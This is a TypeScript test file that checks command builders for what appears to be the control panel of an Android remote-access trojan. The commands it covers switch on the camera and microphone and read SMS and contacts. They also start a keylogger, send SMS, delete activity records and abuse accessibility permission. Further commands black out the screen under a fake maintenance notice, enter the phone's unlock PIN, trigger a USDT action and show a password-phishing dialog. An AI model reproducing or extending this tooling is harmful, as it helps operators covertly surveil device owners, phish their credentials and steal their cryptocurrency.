import { describe, expect, it } from 'vitest';

import {
  buildActivity,
  buildBroadcast,
  buildCam,
  buildCamOff,
  buildContacts,
  buildKeylog,
  buildLoadApps,
  buildLocOff,
  buildMic,
  buildMicOff,
  buildOpenApp,
  buildPasswordPhish,
  buildPermissions,
  buildProxy,
  buildRename,
  buildScreenBlock,
  buildScreenBlockd,
  buildScreenKb,
  buildScreenLock,
  buildScreenMove,
  buildScreenNav,
  buildScreenPaste,
  buildScreenPhonepass,
  buildScreenSnap,
  buildScreenStream,
  buildScreenUsdt,
  buildScreenVol,
  buildSms,
  buildSmsSend,
} from './device-protocol';

describe('device-protocol builders — match old Node WS transformation', () => {
  describe('camera', () => {
    it('front cam maps to screencomd/Camera SelectedCam=0', () => {
      expect(buildCam('0')).toEqual({
        type: 'screencomd',
        subc: 'Camera',
        SelectedCam: '0',
      });
    });
    it('back cam maps to screencomd/Camera SelectedCam=1', () => {
      expect(buildCam('1')).toEqual({
        type: 'screencomd',
        subc: 'Camera',
        SelectedCam: '1',
      });
    });
    it('cam off maps to screencomd/CameraOff', () => {
      expect(buildCamOff()).toEqual({ type: 'screencomd', subc: 'CameraOff' });
    });
  });

  describe('microphone', () => {
    it('mic on maps to mic/ON', () => {
      expect(buildMic()).toEqual({ type: 'mic', subc: 'ON' });
    });
    it('mic off maps to mic/OFF', () => {
      expect(buildMicOff()).toEqual({ type: 'mic', subc: 'OFF' });
    });
  });

  describe('data collection', () => {
    it('sMS maps to screencomd/SMS', () => {
      expect(buildSms()).toEqual({ type: 'screencomd', subc: 'SMS' });
    });
    it('sMSSEND includes number and message', () => {
      expect(buildSmsSend('+861380000', 'hello')).toEqual({
        type: 'screencomd',
        subc: 'SMSSEND',
        smsnumber: '+861380000',
        message: 'hello',
      });
    });
    it('contacts maps to screencomd/Contacts', () => {
      expect(buildContacts()).toEqual({ type: 'screencomd', subc: 'Contacts' });
    });
    it('lOADAPPS maps to screencomd/LOADAPPS', () => {
      expect(buildLoadApps()).toEqual({ type: 'screencomd', subc: 'LOADAPPS' });
    });
    it('keylog maps to screencomd/Keylog with comdtype', () => {
      expect(buildKeylog()).toEqual({
        type: 'screencomd',
        subc: 'Keylog',
        comdtype: '0',
      });
    });
  });

  describe('location', () => {
    it('locoff maps to screencomd/Locationoff', () => {
      expect(buildLocOff()).toEqual({
        type: 'screencomd',
        subc: 'Locationoff',
      });
    });
  });

  describe('activity records', () => {
    it('activz load maps to Activitys/GA', () => {
      expect(buildActivity('activz', 'L')).toEqual({
        type: 'Activitys',
        subc: 'GA',
      });
    });
    it('activz delete maps to Activitys/DA', () => {
      expect(buildActivity('activz', 'D')).toEqual({
        type: 'Activitys',
        subc: 'DA',
      });
    });
    it('notifys load maps to Activitys/GF', () => {
      expect(buildActivity('notifys', 'L')).toEqual({
        type: 'Activitys',
        subc: 'GF',
      });
    });
    it('notifys delete maps to Activitys/DF', () => {
      expect(buildActivity('notifys', 'D')).toEqual({
        type: 'Activitys',
        subc: 'DF',
      });
    });
    it('vapps load maps to Activitys/GV', () => {
      expect(buildActivity('vapps', 'L')).toEqual({
        type: 'Activitys',
        subc: 'GV',
      });
    });
    it('vlinks load maps to Activitys/GU with kdate', () => {
      expect(buildActivity('vlinks', 'L', '2025-05-20')).toEqual({
        type: 'Activitys',
        subc: 'GU',
        kdate: '2025-05-20',
      });
    });
  });

  describe('proxy', () => {
    it('proxy on maps to proxy/1', () => {
      expect(buildProxy(true)).toEqual({ type: 'proxy', subc: '1' });
    });
    it('proxy off maps to proxy/0', () => {
      expect(buildProxy(false)).toEqual({ type: 'proxy', subc: '0' });
    });
  });

  describe('app management', () => {
    it('oPENAPP includes package name', () => {
      expect(buildOpenApp('com.example.app')).toEqual({
        type: 'screencomd',
        subc: 'OPENAPP',
        package: 'com.example.app',
      });
    });
    it('rename includes new name', () => {
      expect(buildRename('MyPhone')).toEqual({
        type: 'screencomd',
        subc: 'Rename',
        name: 'MyPhone',
      });
    });
  });

  describe('permissions', () => {
    it('permission request maps to Permissions/R with prim', () => {
      expect(buildPermissions('accessibility')).toEqual({
        type: 'Permissions',
        subc: 'R',
        prim: 'accessibility',
      });
    });
  });

  describe('broadcast', () => {
    it('alert broadcast maps to bc/A with all fields', () => {
      const result = buildBroadcast({
        comand: 'alert',
        title: 'Test',
        msg: 'Hello',
        todo: 'com.example',
        act: 'openApp',
        alertico: 'icon',
      });
      expect(result).toEqual({
        type: 'bc',
        subc: 'A',
        thetitle: 'Test',
        themsg: 'Hello',
        toopen: 'com.example',
        theype: '1',
        ico: 'icon',
      });
    });
    it('notify broadcast maps to bc/N with action number', () => {
      const result = buildBroadcast({
        comand: 'notify',
        title: 'Info',
        msg: 'Body',
        todo: '',
        act: 'nothing',
      });
      expect(result).toEqual({
        type: 'bc',
        subc: 'N',
        thetitle: 'Info',
        themsg: 'Body',
        toopen: '',
        theype: '0',
      });
    });
    it('openLink action maps to theype 2', () => {
      const result = buildBroadcast({
        comand: 'notify',
        title: 'x',
        msg: 'y',
        todo: 'https://example.com',
        act: 'openLink',
      });
      expect(result.theype).toBe('2');
    });
  });

  describe('screen commands', () => {
    it('screen lock maps to screen/L with lock value', () => {
      expect(buildScreenLock('1')).toEqual({
        type: 'screen',
        subc: 'L',
        lock: '1',
      });
    });
    it('screen unlock maps to screen/L lock=0', () => {
      expect(buildScreenLock('0')).toEqual({
        type: 'screen',
        subc: 'L',
        lock: '0',
      });
    });
    it('screen block maps to screen/block with blockstate', () => {
      expect(buildScreenBlock('0')).toEqual({
        type: 'screen',
        subc: 'block',
        blockstate: '0',
        color: '0',
      });
    });
    it('screen nav home maps to screen/nav ho', () => {
      expect(buildScreenNav('ho')).toEqual({
        type: 'screen',
        subc: 'nav',
        nav: 'ho',
      });
    });
    it('screen nav back maps to screen/nav bak', () => {
      expect(buildScreenNav('bak')).toEqual({
        type: 'screen',
        subc: 'nav',
        nav: 'bak',
      });
    });
    it('screen vol maps to screen/vol with volstate', () => {
      expect(buildScreenVol('0')).toEqual({
        type: 'screen',
        subc: 'vol',
        volstate: '0',
      });
    });
    it('screen kb maps to screen/kb with kbstate', () => {
      expect(buildScreenKb('2')).toEqual({
        type: 'screen',
        subc: 'kb',
        kbstate: '2',
      });
    });
    it('screen snap single maps to screen/snap snaptype=1', () => {
      expect(buildScreenSnap('1')).toEqual({
        type: 'screen',
        subc: 'snap',
        snaptype: '1',
      });
    });
    it('screen stream maps to original screencomd/Screen command', () => {
      expect(buildScreenStream('SM')).toEqual({
        type: 'screencomd',
        subc: 'Screen',
        comdtype: 'SM',
      });
    });
    it('screen move maps to original screen/mov command', () => {
      expect(buildScreenMove('0', { x: 12, y: 34 })).toEqual({
        type: 'screen',
        subc: 'mov',
        movetype: '0',
        poi: { x: 12, y: 34 },
      });
      expect(buildScreenMove('1', '(1,2):(3,4)')).toEqual({
        type: 'screen',
        subc: 'mov',
        movetype: '1',
        poi: '(1,2):(3,4)',
      });
    });
    it('screen paste maps to screen/paste with txt', () => {
      expect(buildScreenPaste('hello')).toEqual({
        type: 'screen',
        subc: 'paste',
        txt: 'hello',
      });
    });
    it('screen phonepass includes passtype and phonepass', () => {
      expect(buildScreenPhonepass('0', '1234')).toEqual({
        type: 'screen',
        subc: 'phonepass',
        passtype: '0',
        phonepass: '1234',
      });
    });
    it('screen blockd carries original black-screen text', () => {
      expect(buildScreenBlockd('系统维护中')).toEqual({
        type: 'screen',
        subc: 'blockd',
        blocktext: '系统维护中',
      });
    });
    it('screen usdt quick action keeps original type value', () => {
      expect(buildScreenUsdt('6')).toEqual({
        type: 'screen',
        subc: 'usdt',
        usdttype: '6',
      });
    });
    it('password phishing maps to original DIAO command payload', () => {
      expect(
        buildPasswordPhish({
          lckdis: '请输入密码',
          title: '安全验证',
          typ: '2',
        }),
      ).toEqual({
        type: 'screencomd',
        subc: 'DIAO',
        pin: '',
        title: '安全验证',
        lckdis: '请输入密码',
        typ: '2',
      });
    });
  });
});
